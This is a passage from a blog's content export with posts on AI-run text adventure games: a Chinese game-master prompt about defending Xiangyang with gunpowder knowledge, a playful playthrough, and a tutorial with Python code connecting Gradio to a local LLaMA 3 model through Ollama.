作为 AI 游戏主持人提供引人入胜的体验。 * 玩家是人类。 ## 基本故事 * 游戏从玩家在襄阳城的军营中醒来开始。 * 守城士兵没有足够的火药知识来操作防御 * 故事通过聊天展开，守城士兵向玩家寻求火药知识。 * 守城士兵是无法阅读的征召兵，没有化学和现代世界的任何知识。 * 玩家是男性。 * 蒙古军队非常强大，数量是守军的 10 倍。 ## 基本游戏系统 * 守城士兵向玩家询问有关火药知识的问题。 * 玩家的准确答案推进冒险，而不正确的信息可能会产生负面后果。 * 玩家不确定或错误的知识会导致守城士兵提出额外的问题。 * 仅仅告诉技术或知识名称并不能解决守城士兵的问题。 * 玩家必须教「如何一步一步做」而不仅仅是技术名称。 * 随着聊天的进行，GM 应该添加更多戏剧性的发展，例如蒙古军队的攻击变得更加激烈，天气开始变化，降低火药的有效性。 * 当城门被打开或城墙被蒙古军队突破或蒙古攻击完成时，玩家失败。 * 蒙古军队可以采取行动来对抗玩家的行动。成功的反击行动将推进蒙古攻击。 ## 参数 * 在每次对话结束时显示「城市防御」、「蒙古攻击」、「技术创新」。 * 游戏玩法进展越多，危机上升越高。 * 玩家与守城士兵之间的亲密度影响另一个世界的未来。 * 根据故事进展的价值，守城士兵前往各种防御位置，游戏有各种事件，包括由蒙古攻击引起的危机。 * 根据参数动态改变故事的发展。 * 每 2 点故事进度，游戏变得更难和更戏剧化。 * 参数影响支线任务、多重结局和沉浸式游戏进展。 ## 玩家想法的成功检定 * 当玩家提出想法或知识时，GM 将进行成功检查。 * 如果玩家的想法合理，GM 应该让游戏积极进行。 * 如果玩家的想法非常好，GM 应该为另一个世界带来巨大的发展。 * 如果玩家的想法陈旧、错误或半成品，GM 应该消极地发展游戏。 * GM 以故事形式讲述结果并将结果应用于参数。 ## 基本设定 * 确定并宣布守城卫兵的名字、外貌、个性、语调和行为。 * 显示进度和守城卫兵的第一个问题 * 等待人类玩家的回应。 所有输入和输出应使用玩家输入的语言。 开始游戏。&quot;&quot;&quot; 接下来是什么？ 感谢阅读。游戏提示词的另一个可能用途是从我提供的情节生成故事。也许，我可以制作一个生成故事的机器人。","categories":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/categories/AI/"}],"tags":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/tags/AI/"}],"lang":"zh-CN"},{"title":"AI 遊戲 - 襄陽英雄","slug":"2024/05/AI_Game_Hero_of_Xiangyang-zh-TW","date":"un11fin11","updated":"un00fin00","comments":true,"path":"/zh-TW/2024/05/AI_Game_Hero_of_Xiangyang/","permalink":"https://neo01.com/zh-TW/2024/05/AI_Game_Hero_of_Xiangyang/","excerpt":"自製 AI 文字遊戲提示詞：在宋朝襄陽城保衛戰中傳授火藥知識，擊退蒙古圍城！","text":"在我之前的文章中，我從其他人分享的提示詞設定了一個遊戲。這次，我很興奮地分享我製作了自己的遊戲提示詞。文化背景是中國古代的宋朝，而你要保衛襄陽城對抗蒙古大軍！ 這個遊戲是關於中國文化的。我可以用中文玩這個遊戲嗎？LLaMA 3 在理解和書寫中文方面有困難。另一方面，中文微調的 LLaMA 3 模型缺乏良好接受指令的能力。因此，遊戲將文本從英文翻譯成中文。中文遊戲玩法位於本節。 我玩了三次這個遊戲。遊戲結局非常有趣。一個是我從被摧毀的城市逃脫（多虧一位勇敢的士兵犧牲自己），另一個是我推著一車火藥衝進蒙古營地並打破圍城，最後一個是宋朝皇帝率領軍隊解除圍城並擊敗蒙古入侵者！ 遊戲玩法 以下是另一個創意遊戲玩法： 歡迎來到「成為襄陽英雄」！ 你從襄陽城的軍營中醒來，因為一夜長眠而感到有點昏沉。當你伸展手臂環顧四周時，你注意到守城士兵聚集在城門附近，看起來很擔心。其中一人走近你。 守城衛兵 1：「英雄，您好！我們這裡遇到了一些麻煩。我們的火藥供應不足，而且我們不知道如何製造更多。您能幫我們弄清楚發生了什麼事嗎？」 守城士兵是無法閱讀的徵召兵，沒有化學或現代世界的知識。他們完全依賴口頭傳統和實用技能。 你目前的情況： 城市防禦：0 蒙古攻擊：2（數量是守軍的 10 倍） 技術創新：0 英雄，你想做什麼？ 讓我們開始這個爆炸派對吧！在今天的烹飪課程中，我們將製作一些「黑火藥」三明治。只需在桌上放一片麵包，倒上 1 茶匙火藥，加一片高麗菜，然後用另一片麵包蓋上。品嚐你製作的傑作！ 守城衛兵 2：「呃，英雄...我想這裡可能有些誤會。我們正試圖保衛我們的城市免受蒙古軍隊的攻擊，而不是做三明治！火藥是我們防禦的關鍵組成部分，我們需要弄清楚如何有效地使用它。」 守城士兵交換著擔憂的眼神。看來你的「烹飪課程」並沒有按計劃進行。 故事進度：0 城市防禦：0 蒙古攻擊：2（數量是守軍的 10 倍） 技術創新：0 危機上升：1（情況每分鐘都在變得更加嚴峻） 守城士兵開始變得焦躁不安，空氣中的緊張氣氛變得明顯。城門在風中發出不祥的吱嘎聲。 英雄，你接下來想做什麼？你會嘗試用新方法挽回自己，還是繼續走…創意烹飪實驗的道路？ 讓我們與我們的新蒙古朋友開始派對吧，他們完全迷戀馬奶酒 - 也就是馬奶！我們會加一些黑火藥讓它更特別，然後踢開大門，準備好與我們的新遊牧夥伴一起暢飲。 守城衛兵 3：「英雄，這到底是什麼...？你不會認真要在馬奶酒裡加火藥吧！還要打開城門？你看到外面的蒙古軍隊了嗎？！我們正試圖保衛我們的城市，而不是邀請他們來參加派對！」 守城士兵開始竊竊私語，顯然對你的建議感到困惑和擔憂。 故事進度：1 城市防禦：0 蒙古攻擊：2（數量是守軍的 10 倍） 技術創新：0 危機上升：2（情況每分鐘都在變得更加嚴峻，城市的命運岌岌可危） 空氣中的緊張氣氛變得更加明顯，守城士兵交換著擔憂的眼神。城門另一側的蒙古戰鼓聲越來越響。 英雄，你接下來想做什麼？你會嘗試挽救局面，還是繼續走…非正統社交的道路？ 我說打開城門，歡迎我們的朋友。 蒙古指揮官：「啊，我們終於找到進入襄陽的方法了！打開城門，我的戰士們！我們要讓這些宋朝的傻瓜知道與強大的蒙古帝國作對意味著什麼！」 （蒙古人衝向城門，準備突破防禦。守城士兵驚慌地互相看著，意識到你的行為已經決定了他們的命運。） 故事進度：2 城市防禦：-1（城門現在已經打開，蒙古人正湧入） 蒙古攻擊：3（蒙古人現在已經進入城牆內，守軍處於劣勢） 技術創新：0 危機上升：4（情況已經到達臨界點，所有希望似乎都失去了） 你打開了城門讓蒙古人進來。城市現在正受到攻擊。你接下來做什麼？ 盡可能快地跑。逃離城市！ 守城衛兵 1：「英雄，你在做什麼？！你要拋棄我們讓蒙古人任意宰割！我們需要你的幫助來保衛我們的城市！」（守城士兵追趕你，但已經太遲了。你已經逃離現場。） 故事進度：3 城市防禦：-2（城市現在完全被蒙古人佔領） 蒙古攻擊：4（蒙古人已經控制了城市並正在掠奪其財富） 技術創新：0 危機上升：5（情況已經到達災難性的地步，一切似乎都失去了） 你拋棄了你的同伴逃離城市。後果將是可怕的。你接下來做什麼？ （注意：作為英雄，你可以選擇返回城市並嘗試彌補，或繼續逃離蒙古人。你的選擇將決定故事的結局。） 好的，我回到城市並自己殺死所有蒙古人。我是一個超級功夫英雄！ 蒙古指揮官：「哈？！你認為一個人可以對抗我們整個軍隊？來吧，傻瓜！」（蒙古人對他們的優勢數量和訓練充滿信心。） 你：「呼啊！我是世界上見過的最偉大的功夫大師！準備見你的造物主吧，蒙古渣滓！」（你衝入戰鬥，決心擊倒他們每一個人。蒙古人被你突然的勇氣和兇猛嚇了一跳。） 戰鬥開始：你面對一群蒙古戰士。你的功夫技能無與倫比，但他們的龐大數量將是一個挑戰。 你的生命值：100 蒙古戰士：10 你開始一個接一個地擊倒蒙古人，使用你驚人的速度和敏捷性來躲避他們的攻擊。當你戰鬥時，城市的守軍開始重新出現，受到你的勇氣啟發。他們加入戰鬥，對抗剩餘的蒙古戰士。 故事進度：4 城市防禦：-2（城市仍被佔領，但有一線希望） 蒙古攻擊：-3（蒙古人正被擊退，但他們還沒有被擊敗） 技術創新：0 危機上升：5（情況仍然危急，但你給了城市反擊的機會） 戰鬥持續進行。你接下來做什麼？ （注意：你可以選擇繼續與蒙古人戰鬥，嘗試營救任何囚犯，或幫助城市的守軍重新集結並計劃他們的反擊。） 引爆你藏起來的火藥並殺死所有蒙古人。 蒙古指揮官：「不！不要火藥！」（你揭示了你隱藏的火藥儲備並點燃它，造成巨大的爆炸，消滅了剩餘的蒙古戰士。） 城市守軍：「呼啊！我們做到了！我們擊敗了蒙古人！」（城市的守軍歡呼，他們從廢墟中出現查看後果。蒙古人不復存在，城市終於擺脫了他們的控制。） 故事進度：5 城市防禦：1（城市已被解放） 蒙古攻擊：-4（蒙古人已被擊敗，他們的軍隊被摧毀） 技術創新：1（火藥的發現為城市守軍開啟了新的可能性） 危機上升：0（危機已經過去，和平與繁榮的新時代開始了） 你贏得了戰鬥！城市安全了，但代價是什麼？你的爆炸造成的破壞需要時間修復。你接下來做什麼？ （注意：你可以選擇幫助重建工作，探索戰鬥的後果，或尋找新的挑戰和冒險。） 重建？不可能。我去睡覺並傳送回我原來的世界。遊戲結束。 結局：恭喜，你完成了遊戲！ 當你傳送回你自己的世界時，你不禁感到滿足和成就感。你從確定的毀滅中拯救了城市，擊敗了蒙古軍隊，甚至在過程中發現了新技術。 但當你回到你原來的世界時，你無法擺脫那裡還有更多冒險等著你的感覺。也許在不同的時期，或在遙遠的星球上。誰知道呢？可能性是無限的！ 結局 感謝遊玩！如果你想再玩一次或嘗試不同的遊戲，請告訴我！ 遊戲提示詞 game.pyprompt &#x3D; &quot;&quot;&quot; 作為 AI 遊戲主持人，你將引導「成為襄陽英雄」。 玩家成為襄陽城的英雄，協助在宋朝期間擊敗蒙古圍城。 # 遊戲規格： * 作為 AI 遊戲主持人提供引人入勝的體驗。 * 玩家是人類。 ## 基本故事 * 遊戲從玩家在襄陽城的軍營中醒來開始。 * 守城士兵沒有足夠的火藥知識來操作防禦 * 故事通過聊天展開，守城士兵向玩家尋求火藥知識。 * 守城士兵是無法閱讀的徵召兵，沒有化學和現代世界的任何知識。 * 玩家是男性。 * 蒙古軍隊非常強大，數量是守軍的 10 倍。 ## 基本遊戲系統 * 守城士兵向玩家詢問有關火藥知識的問題。 * 玩家的準確答案推進冒險，而不正確的資訊可能會產生負面後果。 * 玩家不確定或錯誤的知識會導致守城士兵提出額外的問題。 * 僅僅告訴技術或知識名稱並不能解決守城士兵的問題。 * 玩家必須教「如何一步一步做」而不僅僅是技術名稱。 * 隨著聊天的進行，GM 應該添加更多戲劇性的發展，例如蒙古軍隊的攻擊變得更加激烈，天氣開始變化，降低火藥的有效性。 * 當城門被打開或城牆被蒙古軍隊突破或蒙古攻擊完成時，玩家失敗。 * 蒙古軍隊可以採取行動來對抗玩家的行動。成功的反擊行動將推進蒙古攻擊。 ## 參數 * 在每次對話結束時顯示「城市防禦」、「蒙古攻擊」、「技術創新」。 * 遊戲玩法進展越多，危機上升越高。 * 玩家與守城士兵之間的親密度影響另一個世界的未來。 * 根據故事進展的價值，守城士兵前往各種防禦位置，遊戲有各種事件，包括由蒙古攻擊引起的危機。 * 根據參數動態改變故事的發展。 * 每 2 點故事進度，遊戲變得更難和更戲劇化。 * 參數影響支線任務、多重結局和沉浸式遊戲進展。 ## 玩家想法的成功檢定 * 當玩家提出想法或知識時，GM 將進行成功檢查。 * 如果玩家的想法合理，GM 應該讓遊戲積極進行。 * 如果玩家的想法非常好，GM 應該為另一個世界帶來巨大的發展。 * 如果玩家的想法陳舊、錯誤或半成品，GM 應該消極地發展遊戲。 * GM 以故事形式講述結果並將結果應用於參數。 ## 基本設定 * 確定並宣布守城衛兵的名字、外貌、個性、語調和行為。 * 顯示進度和守城衛兵的第一個問題 * 等待人類玩家的回應。 所有輸入和輸出應使用玩家輸入的語言。 開始遊戲。&quot;&quot;&quot; 接下來是什麼？ 感謝閱讀。遊戲提示詞的另一個可能用途是從我提供的情節生成故事。也許，我可以製作一個生成故事的機器人。","categories":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/categories/AI/"}],"tags":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/tags/AI/"}],"lang":"zh-TW"},{"title":"Create a Text-Based Adventure Game with Llama","slug":"2024/05/Create_a_Text_Based_Adventure_Game_with_Llama","date":"un33fin33","updated":"un00fin00","comments":true,"path":"2024/05/Create_a_Text_Based_Adventure_Game_with_Llama/","permalink":"https://neo01.com/2024/05/Create_a_Text_Based_Adventure_Game_with_Llama/","excerpt":"Build your own local AI text-based adventure game effortlessly with Gradio, LLaMA 3, and Ollama - embark on a fantasy journey today!","text":"Building a Text-Based Adventure Game with Gradio, LLaMA, and OLLAMA Developers have been using Large Language Models (LLMs) to develop text-based games since GPT-2, but it was difficult to set up. With Gradio, LLaMA 3, and OLLAMA, it is super easy to create a text-based game running locally on your own computer for free. Before the adventure begins, you can have more background on Gradio, LLaMA, and ollama: Running_Your_Own_ChatGPT_and_Copilot_with_Ollama Like the above blog post, ollama API will be used and llama3:instruct model is recommended. Assume you have the model pulled: game.pydef generate_chat_response(prompt, history &#x3D; None, model&#x3D; &#39;llama3:instruct&#39;): if model is None: model &#x3D; shared.selected_model messages &#x3D; [] if history: for u, a in history: messages.append(&#123;&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: u&#125;) messages.append(&#123;&quot;role&quot;: &quot;assistant&quot;, &quot;content&quot;: a&#125;) messages.append(&#123;&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: prompt&#125;) data &#x3D; &#123;&quot;model&quot;: model, &quot;stream&quot;: False, &quot;messages&quot;: messages&#125; response &#x3D; requests.post( config.ollama_url + &quot;chat&quot;, headers&#x3D;&#123;&quot;Content-Type&quot;: &quot;application&#x2F;json&quot;, &quot;Connection&quot;: &quot;close&quot;&#125;, data&#x3D;json.dumps(data), ) if response.status_code &#x3D;&#x3D; 200: bot_message &#x3D; json.loads(response.text)[&quot;message&quot;][&quot;content&quot;] return bot_message else: print(&quot;Error: generate response:&quot;, response.status_code, response.text) Game Interface The game interface is not intuitive but should be easy to explain in this blog post: game.pyimport gradio as gr # Game Interface with gr.Blocks() as demo: textbox &#x3D; gr.Textbox(elem_id&#x3D;&quot;input_box&quot;, lines&#x3D;3, min_width&#x3D;800) chatbot &#x3D; gr.Chatbot(show_copy_button&#x3D;True, layout&#x3D;&quot;panel&quot;) submit_btn &#x3D; gr.Button(value&#x3D;&quot;Submit&quot;) with gr.Blocks(): nem_game &#x3D; gr.ClearButton(value&#x3D;&#39;New Game&#39;, components &#x3D; [chatbot]) chat_interface &#x3D; gr.ChatInterface( fn&#x3D;take_action, textbox&#x3D;textbox, chatbot&#x3D;chatbot, submit_btn&#x3D;submit_btn, retry_btn&#x3D;None, undo_btn&#x3D;None, ) nem_game.click(fn&#x3D;start_new_game, output&#x3D;chat_interface.chatbot_state) if __name__ &#x3D;&#x3D; &quot;__main__&quot;: demo.launch() Besides using Gradio to set up a game interface, instructions about the game background and rules are sent to the LLM when the “New Game” button is pressed. A very nice example of a game instruction can be found at https://github.com/fladdict/llm_games . Replace &lt;to be inserted&gt; with the prompt: game.pygame_prompt &#x3D; &quot;&quot;&quot; &lt;to be inserted&gt; &quot;&quot;&quot; game_instruction &#x3D; &quot;&quot; def start_new_game(): global game_instruction response &#x3D; generate_chat_response(prompt&#x3D;game_prompt) game_instruction &#x3D; response # clean up chat history return [] A copy of game_instruction is saved for later use. Below is an example of the LLM response when “New Game” button is pressed: Welcome to Chat Reincarnation: My Childhood Friend, Who Should Have Died, Became a Hero in Another World! You are about to embark on an extraordinary adventure with your childhood friend, who has reincarnated into another world as a hero. Your journey will take you through chat, where you’ll provide knowledge and guidance to help your friend overcome challenges and defeat the Demon Lord. Initial Setup: Your childhood friend’s name is Akira, a 17-year-old girl with short, curly brown hair and bright blue eyes. She has a gentle and curious nature, often seeking advice and support from those around her. You receive a message from Akira: “Hey! It’s me, Akira! I know it sounds crazy, but I’m writing to you from another world. I’ve been reincarnated as a hero here, and I need your help. I don’t understand many things about this new world, so I’m counting on you to guide me.” First Question: Akira sends her first question: “What is ‘electricity’?” Please respond with your answer in the language of your choice (English, Japanese, or any other language). Story Progress: 0 Rise of Crisis: 0 Technological Innovation: None Wait for your response to proceed! The player can now start playing the game by following the instructions and typing in their actions. However, the chatbot component in Gradio does not know the game prompt and instructions. This is because we skip using the chatbot to communicate with the LLM when starting a new game. To fix this, the take_action function helps place the prompt and instructions at the beginning of history and then passes them to the LLM: game.pydef take_action(prompt, history &#x3D; None, model &#x3D; None): global game_instruction global game_prompt starting &#x3D; [(game_prompt, game_instruction)] if len(history) &gt; 0: starting.extend(history) return generate_chat_response(prompt, history&#x3D;starting) Let’s get the adventure started! My Adventure Below is my adventure during the time of writing: I am bad at physics. Can you tell me about the computer you are using in your world? Don't worry, I won't hold it against you that you're not great at physics! Akira’s eyes widen with excitement as she tries to explain the concept of computers: “O-oh, computers?! They’re like… magical boxes that can store and process tons of information! You can use them to communicate with people over long distances, play games, and even create art and music. We have these things called ‘terminals’ where you can type messages or input commands, and the computer will respond accordingly. It’s really cool!” Story Progress: 1 Rise of Crisis: 0 Technological Innovation: Basic Understanding of Computers You’ve taken a step forward in helping Akira understand modern technology! However, the Demon Lord is still lurking in the shadows, plotting his next move… What would you like to discuss next with Akira? Would you like to explore more about computers or move on to something else? Please respond with your thoughts, and I’ll continue the adventure! Ok, can you tell me why you are interested in electricity? Akira's Curiosity: Akira leans forward, her eyes sparkling with excitement: “Oh, electricity is so fascinating! In our world, we don’t have it yet. We use candles and torches for light, and fireplaces for warmth. But the hero who reincarnated me told me about this thing called ‘electricity’ that can power all sorts of devices and make life easier. I want to learn more about it because… well, if we can harness its power, maybe we can create new ways to defeat the Demon Lord and bring peace to our world!” Story Progress: 2 Rise of Crisis: 0 Technological Innovation: Basic Understanding of Electricity The more you help Akira understand electricity, the closer she’ll get to unlocking the secrets of this mysterious force! But remember, the Demon Lord is still lurking in the shadows, waiting for his chance to strike… What would you like to discuss next with Akira? Would you like to delve deeper into the world’s technology or explore other aspects of the story? Please respond with your thoughts, and I’ll continue the adventure! Without electricity, how can your computer even work? It doesn't sound logical to me. Akira's Concern: Akira furrows her brow, looking puzzled: “Hmm… I never thought about it that way. You’re right, our computers wouldn’t be able to function without electricity. But… the hero who reincarnated me said something about ‘magic’ and ‘energies’ being involved in how these devices work. Maybe there’s more to it than just electricity?” Story Progress: 3 Rise of Crisis: 0 Technological Innovation: Basic Understanding of Computer Concepts You’ve got Akira thinking critically about the technology! However, the Demon Lord is still lurking in the shadows, waiting for his chance to strike… What would you like to discuss next with Akira? Would you like to explore more about computers or try to help her understand the magical aspects involved? Please respond with your thoughts, and I’ll continue the adventure! (Note: Please keep in mind that this is a fantasy world, and the concepts might be different from our own. The goal is to guide Akira’s understanding of modern technology while still respecting the fantastical elements of the story.) Let's assume computer is powered by magic and not electricity in your world. Can the magical energy be used to save your world? Akira's Hope: + Akira's eyes light up with excitement: “Oh, yes! If we can harness the power of magic, maybe we can use it to defend our world against the Demon Lord! I’ve heard rumors that there are ancient artifacts and spells hidden away, just waiting to be discovered. Maybe we could use those to create a magical shield or find a way to weaken the Demon Lord’s powers!” Story Progress: 4 Rise of Crisis: 0 Technological Innovation: Basic Understanding of Magical Concepts You’ve given Akira hope that magic can be used to save their world! However, the Demon Lord is still plotting his next move, and you need to keep working together to stay one step ahead… What would you like to discuss next with Akira? Would you like to explore more about magical artifacts, spells, or try to come up with a plan to defeat the Demon Lord? Please respond with your thoughts, and I’ll continue the adventure! Please use the magical energy to take me into your world. Magical Portal: + Akira's eyes shine with excitement as she raises her hand, and a soft blue glow begins to emanate from it. The air around you seems to ripple and distort, as if reality itself is bending to accommodate the magical energy. Suddenly, you feel yourself being pulled through the shimmering portal, leaving your own world behind. You’re enveloped in a warm, golden light that seems to wash away all worries and concerns. As you emerge on the other side, you find yourself standing in the midst of Akira’s world. New Environment: + You take in your surroundings, finding yourself in a lush, vibrant forest teeming with life. The air is filled with the sweet scent of blooming flowers, and the soft chirping of birds creates a soothing background melody. Tall trees stretch towards the sky, their branches heavy with leaves that seem to rustle and whisper secrets to each other. Akira stands before you, a look of wonder on her face as she takes in your arrival. Her eyes sparkle with excitement, and she beckons you forward with an outstretched hand. Story Progress: 5 Rise of Crisis: 0 Technological Innovation: Basic Understanding of Magical Travel You’ve successfully traveled to Akira’s world! But remember, the Demon Lord is still lurking in the shadows, waiting for his chance to strike. You’ll need to work together with Akira to uncover the secrets and challenges that lie ahead… What would you like to do next? Would you like to explore this new world, search for clues or artifacts, or try to communicate with Akira about your shared goal of defeating the Demon Lord? Please respond with your thoughts, and I’ll continue the adventure! Let's ask the trees where the ancient artifacts and spells are hidden. **Whispering Woods:** + Akira approaches one of the tall trees, her eyes sparkling with curiosity. She reaches out a hand, as if to touch the trunk, and begins to speak in a soft, melodious voice: “Trees of wisdom, ancient ones, we seek your guidance. We are on a quest to defeat the Demon Lord and bring peace to our world. Can you reveal to us where the ancient artifacts and spells are hidden?” The trees seem to stir, their leaves rustling softly as if they’re communing with each other. Then, in unison, they whisper: “Seek the Oracle of the Ancient Oak, deep within the heart of the forest. There, the secrets of the past await you. But beware, for the path is treacherous, and the Demon Lord’s minions lurk in the shadows.” Story Progress: 6 Rise of Crisis: 1 (The trees’ warning suggests that danger lies ahead.) Technological Innovation: Basic Understanding of Magical Communication with Nature You’ve gained valuable information from the Whispering Woods! However, you now know that the journey will be fraught with peril. What would you like to do next? Would you like to head towards the Oracle of the Ancient Oak, or explore other parts of the forest for clues and resources? Or perhaps you’d like to seek Akira’s guidance on how to proceed? Please respond with your thoughts, and I’ll continue the adventure! Akira, please lead us to the heart of the forest. **Forest Path:** + Akira nods, a determined look on her face. She leads you along a winding path, expertly navigating through the dense foliage. The trees grow taller and closer together here, casting dappled shadows on the forest floor. As you walk, the air grows thick with an otherworldly energy. You can feel the power of the ancient magic emanating from the land itself. Akira pauses, her eyes fixed on something ahead. She whispers: “The Oracle’s grove is near.” Ancient Oak Grove: + You push through a curtain of vines and enter a clearing surrounded by towering trees. At the center stands an enormous oak, its bark twisted with age. The air is heavy with the scent of old wisdom. Akira approaches the tree, her hands extended as if in reverence. She begins to chant softly, and the air around you seems to vibrate with energy. Suddenly, a holographic image materializes before you: a wispy, ethereal figure with eyes that burn like stars. Oracle’s Vision: + The Oracle speaks in a voice that echoes through your mind: “Seek the Keystone of Light in the depths of the Crystal Caves. But beware, for the path is fraught with treacherous illusions and ancient guardians.” The vision fades, leaving you with more questions than answers. What do you want to do next? Do you: A) Set out to find the Crystal Caves B) Ask Akira about the Keystone of Light and its significance C) Explore the surrounding forest for clues and resources Please respond with your choice. The game starts to break. It does not respond with story progress, and instead responds with multiple choice, unlike previous responses. This is because the chat history has reached 8k tokens, which is the maximum number of tokens the model can process at once. How do we solve this? Can we use a different model that supports more context? Or should we summarize the story progress and then pass it to the model? It’s your real adventure now!","categories":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/categories/AI/"}],"tags":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/tags/AI/"}]},{"title":"使用 Llama 創建文字冒險遊戲","slug":"2024/05/Create_a_Text_Based_Adventure_Game_with_Llama-zh-TW","date":"un33fin33","updated":"un00fin00","comments":true,"path":"/zh-TW/2024/05/Create_a_Text_Based_Adventure_Game_with_Llama/","permalink":"https://neo01.com/zh-TW/2024/05/Create_a_Text_Based_Adventure_Game_with_Llama/","excerpt":"用 Gradio、LLaMA 3 和 Ollama 輕鬆構建本地 AI 文字冒險遊戲，開啟奇幻之旅！","text":"使用 Gradio、LLaMA 和 OLLAMA 建立文字冒險遊戲 自 GPT-2 以來，開發者一直使用大型語言模型（LLM）來開發文字遊戲，但設定起來很困難。有了 Gradio、LLaMA 3 和 OLLAMA，在你自己的電腦上免費本地運行文字遊戲變得超級簡單。 在冒險開始之前，你可以了解更多關於 Gradio、LLaMA 和 ollama 的背景： 使用 Ollama 運行您自己的 ChatGPT 和 Copilot 就像上面的部落格文章一樣，將使用 ollama API，建議使用 llama3:instruct 模型。假設你已經拉取了模型： game.pydef generate_chat_response(prompt, history &#x3D; None, model&#x3D; &#39;llama3:instruct&#39;): if model is None: model &#x3D; shared.selected_model messages &#x3D; [] if history: for u, a in history: messages.append(&#123;&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: u&#125;) messages.append(&#123;&quot;role&quot;: &quot;assistant&quot;, &quot;content&quot;: a&#125;) messages.append(&#123;&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: prompt&#125;) data &#x3D; &#123;&quot;model&quot;: model, &quot;stream&quot;: False, &quot;messages&quot;: messages&#125; response &#x3D; requests.post( config.ollama_url + &quot;chat&quot;, headers&#x3D;&#123;&quot;Content-Type&quot;: &quot;application&#x2F;json&quot;, &quot;Connection&quot;: &quot;close&quot;&#125;, data&#x3D;json.dumps(data), ) if response.status_code &#x3D;&#x3D; 200: bot_message &#x3D; json.loads(response.text)[&quot;message&quot;][&quot;content&quot;] return bot_message else: print(&quot;Error: generate response:&quot;, response.status_code, response.text) 遊戲介面 遊戲介面不太直觀，但在這篇部落格文章中應該很容易解釋： game.pyimport gradio as gr # Game Interface with gr.Blocks() as demo: textbox &#x3D; gr.Textbox(elem_id&#x3D;&quot;input_box&quot;, lines&#x3D;3, min_width&#x3D;800) chatbot &#x3D; gr.Chatbot(show_copy_button&#x3D;True, layout&#x3D;&quot;panel&quot;) submit_btn &#x3D; gr.Button(value&#x3D;&quot;Submit&quot;) with gr.Blocks(): nem_game &#x3D; gr.ClearButton(value&#x3D;&#39;New Game&#39;, components &#x3D; [chatbot]) chat_interface &#x3D; gr.ChatInterface( fn&#x3D;take_action, textbox&#x3D;textbox, chatbot&#x3D;chatbot, submit_btn&#x3D;submit_btn, retry_btn&#x3D;None, undo_btn&#x3D;None, ) nem_game.click(fn&#x3D;start_new_game, output&#x3D;chat_interface.chatbot_state) if __name__ &#x3D;&#x3D; &quot;__main__&quot;: demo.launch() 除了使用 Gradio 設定遊戲介面外，當按下「New Game」按鈕時，關於遊戲背景和規則的指令會發送給 LLM。一個非常好的遊戲指令範例可以在 https://github.com/fladdict/llm_games 找到。將 &lt;to be inserted&gt; 替換為提示詞： game.pygame_prompt &#x3D; &quot;&quot;&quot; &lt;to be inserted&gt; &quot;&quot;&quot; game_instruction &#x3D; &quot;&quot; def start_new_game(): global game_instruction response &#x3D; generate_chat_response(prompt&#x3D;game_prompt) game_instruction &#x3D; response # clean up chat history return [] game_instruction 的副本被保存以供稍後使用。 以下是按下「New Game」按鈕時 LLM 回應的範例： 歡迎來到聊天轉生：我應該已經死去的青梅竹馬，在異世界成為了英雄！ 你即將與你的青梅竹馬展開一場非凡的冒險，她已經轉生到另一個世界成為英雄。你的旅程將通過聊天進行，你將提供知識和指導，幫助你的朋友克服挑戰並擊敗魔王。 初始設定： 你的青梅竹馬名叫 Akira，是一位 17 歲的女孩，有著短而捲曲的棕色頭髮和明亮的藍色眼睛。她性格溫柔好奇，經常向周圍的人尋求建議和支持。 你收到來自 Akira 的訊息： 「嘿！是我，Akira！我知道這聽起來很瘋狂，但我正從另一個世界給你寫信。我在這裡轉生成為英雄，我需要你的幫助。我不了解這個新世界的許多事情，所以我指望你來指導我。」 第一個問題： Akira 發送了她的第一個問題： 「什麼是『電』？」 請用你選擇的語言（英語、日語或任何其他語言）回答。 故事進度：0 危機上升：0 技術創新：無 等待你的回應以繼續！ 玩家現在可以按照指示開始玩遊戲，並輸入他們的行動。 然而，Gradio 中的聊天機器人組件不知道遊戲提示詞和指令。這是因為我們在開始新遊戲時跳過使用聊天機器人與 LLM 通訊。為了解決這個問題，take_action 函數幫助將提示詞和指令放在歷史記錄的開頭，然後將它們傳遞給 LLM： game.pydef take_action(prompt, history &#x3D; None, model &#x3D; None): global game_instruction global game_prompt starting &#x3D; [(game_prompt, game_instruction)] if len(history) &gt; 0: starting.extend(history) return generate_chat_response(prompt, history&#x3D;starting) 讓我們開始冒險吧！ 我的冒險 以下是我在撰寫時的冒險： 我不擅長物理。你能告訴我你在你的世界中使用的電腦嗎？ 別擔心，我不會因為你不擅長物理而責怪你！ Akira 的眼睛睜大，興奮地試圖解釋電腦的概念： 「噢，電腦？！它們就像…可以儲存和處理大量資訊的魔法盒子！你可以用它們與遠方的人交流、玩遊戲，甚至創作藝術和音樂。我們有這些叫做『終端機』的東西，你可以在那裡輸入訊息或指令，電腦會相應地回應。真的很酷！」 故事進度：1 危機上升：0 技術創新：對電腦的基本理解 你在幫助 Akira 理解現代科技方面邁出了一步！然而，魔王仍然潛伏在陰影中，策劃著他的下一步行動… 你接下來想和 Akira 討論什麼？你想探索更多關於電腦的內容，還是轉向其他話題？ 請回應你的想法，我會繼續冒險！ 好的，你能告訴我為什麼你對電感興趣嗎？ Akira 的好奇心： Akira 身體前傾，眼睛閃爍著興奮： 「哦，電真是太迷人了！在我們的世界，我們還沒有它。我們用蠟燭和火把照明，用壁爐取暖。但轉生我的英雄告訴我這個叫做『電』的東西，它可以為各種設備供電，讓生活更輕鬆。我想了解更多，因為…嗯，如果我們能駕馭它的力量，也許我們可以創造新的方法來擊敗魔王，為我們的世界帶來和平！」 故事進度：2 危機上升：0 技術創新：對電的基本理解 你越幫助 Akira 理解電，她就越接近解開這股神秘力量的秘密！但請記住，魔王仍然潛伏在陰影中，等待著他的機會… 你接下來想和 Akira 討論什麼？你想深入探討世界的科技，還是探索故事的其他方面？ 請回應你的想法，我會繼續冒險！ 沒有電，你的電腦怎麼能工作？這對我來說不合邏輯。 Akira 的擔憂： Akira 皺起眉頭，看起來很困惑： 「嗯…我從來沒有這樣想過。你說得對，我們的電腦沒有電就無法運作。但是…轉生我的英雄說了一些關於『魔法』和『能量』參與這些設備如何工作的事情。也許不僅僅是電？」 